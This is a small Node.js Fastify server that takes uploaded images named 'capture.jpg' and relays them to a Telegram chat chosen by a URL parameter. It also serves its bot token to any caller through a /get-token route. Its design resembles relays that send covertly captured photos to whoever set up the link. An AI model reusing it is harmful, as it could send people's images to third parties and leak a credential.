require("dotenv").config();
const path = require("path");
const fs = require("fs");
const fastify = require("fastify")({ logger: false });
const multer = require("fastify-multer");
const fetch = require("node-fetch");
const FormData = require("form-data");

const upload = multer.memoryStorage();
fastify.register(multer.contentParser);
fastify.register(multer, { storage: upload });

// Sert les fichiers statiques du dossier "public"
fastify.register(require('@fastify/static'), {
  root: path.join(__dirname, 'public'),
});

const botToken = process.env.BOT_TOKEN;

fastify.post("/upload", async (req, reply) => {
  const data = await req.file();

  if (!data) {
    return reply.status(400).send({ error: "Aucune image reçue." });
  }

  const { uid } = req.query;
  if (!uid || !botToken) {
    return reply.status(400).send({ error: "UID ou token manquant." });
  }

  const form = new FormData();
  form.append("chat_id", uid);
  form.append("photo", data.file, { filename: "capture.jpg" });

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      body: form,
    });

    const json = await response.json();
    reply.send(json);
  } catch (err) {
    console.error("Erreur Telegram:", err);
    reply.status(500).send({ error: "Erreur lors de l'envoi à Telegram." });
  }
});

// Route pour donner le token à la page HTML
fastify.get("/get-token", async (req, reply) => {
  reply.send({ token: process.env.BOT_TOKEN });
});

fastify.listen({ port: process.env.PORT || 3000 }, (err) => {
  if (err) throw err;
  console.log("Serveur démarré sur le port 3000");
});
